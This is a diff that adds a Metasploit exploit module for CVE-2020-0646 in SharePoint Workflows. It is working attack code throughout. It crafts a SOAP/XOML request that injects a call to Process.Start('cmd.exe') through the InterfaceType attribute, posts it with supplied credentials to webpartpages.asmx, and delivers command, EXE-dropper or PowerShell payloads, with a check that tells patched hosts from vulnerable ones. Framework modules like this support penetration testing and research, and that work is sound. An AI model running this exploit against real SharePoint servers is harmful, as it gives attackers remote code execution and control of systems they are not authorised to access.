@@ -1,0 +1,142 @@
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'SharePoint Workflows XOML Injection',
+      'Description' => %q{
+        This module exploits a vulnerability within SharePoint and its .NET backend
+        that allows an attacker to execute commands using specially crafted XOML data
+        sent to SharePoint via the Workflows functionality.
+      },
+      'Author' => [
+        'Spencer McIntyre',
+        'Soroush Dalili'
+      ],
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['CVE', '2020-0646'],
+        ['URL', 'https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/']
+      ],
+      'Platform' => 'win',
+      'Targets' => [
+        [ 'Windows EXE Dropper', { 'Arch' => [ARCH_X86, ARCH_X64], 'Type' => :windows_dropper } ],
+        [ 'Windows Command', { 'Arch' => ARCH_CMD, 'Type' => :windows_command, 'Space' => 3000 } ],
+        [ 'Windows Powershell',
+          'Arch'         => [ARCH_X86, ARCH_X64],
+          'Type'         => :windows_powershell
+        ]
+      ],
+      'DefaultOptions' => {
+        'RPORT' => 443,
+        'SSL'   => true
+      },
+      'DefaultTarget' => 0,
+      'DisclosureDate' => '2020-03-02',
+      'Notes' =>
+      {
+        'Stability'   => [CRASH_SAFE,],
+        'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
+        'Reliability' => [REPEATABLE_SESSION],
+      },
+      'Privileged' => true
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [ true, 'The base path to the SharePoint application', '/' ]),
+      OptString.new('DOMAIN',    [ true, 'The domain to use for Windows authentication', 'WORKGROUP' ]),
+      OptString.new('USERNAME',  [ true, 'Username to authenticate as', '' ]),
+      OptString.new('PASSWORD',  [ true, 'The password to authenticate with' ])
+    ])
+  end
+
+  def check
+    res = execute_command("echo #{Rex::Text.rand_text_alphanumeric(4 + rand(8))}")
+    return CheckCode::Unknown('Did not receive an HTTP 200 OK response') unless res&.code == 200
+
+    compiler_errors = extract_compiler_errors(res)
+    return CheckCode::Unknown('No compiler errors were reported') unless compiler_errors&.length > 0
+
+    # once patched you get a specific compiler error message about the type name
+    return CheckCode::Safe if compiler_errors[0].to_s =~ /is not a valid language-independent type name/
+
+    CheckCode::Vulnerable
+  end
+
+  def extract_compiler_errors(res)
+    return nil unless res&.code == 200
+
+    xml_doc = res.get_xml_document
+    result = xml_doc.search('//*[local-name()=\'ValidateWorkflowMarkupAndCreateSupportObjectsResult\']').text
+    return nil if result.length == 0
+
+    xml_result = Nokogiri::XML(result)
+    xml_result.xpath('//CompilerError/@Text')
+  end
+
+  def exploit
+    # NOTE: Automatic check is implemented by the AutoCheck mixin
+    super
+
+    case target['Type']
+    when :windows_command
+      execute_command(payload.encoded)
+    when :windows_dropper
+      cmd_target = targets.select {|target| target['Type'] == :windows_command}.first
+      execute_cmdstager({linemax: cmd_target.opts['Space']})
+    when :windows_powershell
+      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))
+    end
+  end
+
+  def escape_command(cmd)
+    # a bunch of characters have to be escaped, so use a whitelist of those that are allowed and escape the rest as unicode
+    cmd.gsub(/([^a-zA-Z0-9 $:;\-\.=\[\]\{\}\(\)])/) { |x| "\\u%.4x" %x.unpack('C*')[0] }
+  end
+
+  def execute_command(cmd, opts = {})
+    xoml_data = <<-EOS
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages">
+      <workflowMarkupText>
+        <![CDATA[
+          <SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
+            <CallExternalMethodActivity x:Name="foo" MethodName='test1' InterfaceType='System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe", "/c #{escape_command(cmd)}");private/**/void/**/foobar(){//' />
+          </SequentialWorkflowActivity>
+        ]]>
+      </workflowMarkupText>
+      <rulesText></rulesText>
+      <configBlob></configBlob>
+      <flag>2</flag>
+    </ValidateWorkflowMarkupAndCreateSupportObjects>
+  </soap:Body>
+</soap:Envelope>
+    EOS
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, '_vti_bin', 'webpartpages.asmx'),
+      'ctype'    => 'text/xml; charset=utf-8',
+      'data'     => xoml_data,
+      'username' => datastore['USERNAME'],
+      'password' => datastore['PASSWORD']
+    })
+
+    unless res&.code == 200
+      print_error('Non-200 HTTP response received while trying to execute the command')
+    end
+
+    res
+  end
+end
